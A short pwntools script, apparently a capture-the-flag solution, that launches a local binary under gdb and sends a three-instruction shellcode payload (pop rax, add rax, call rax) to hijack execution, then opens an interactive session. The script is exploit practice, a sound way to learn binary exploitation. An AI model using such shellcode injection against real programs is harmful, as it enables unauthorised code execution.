from pwn import *
context.log_level='debug'
context.arch="amd64"
p=process("./binary")
p.recv()
gdb.attach(p,"b*0x400663")
payload=asm("pop rax")
payload+=asm("add rax,-111")
payload+=asm("call rax")
p.sendline(payload)
p.interactive()
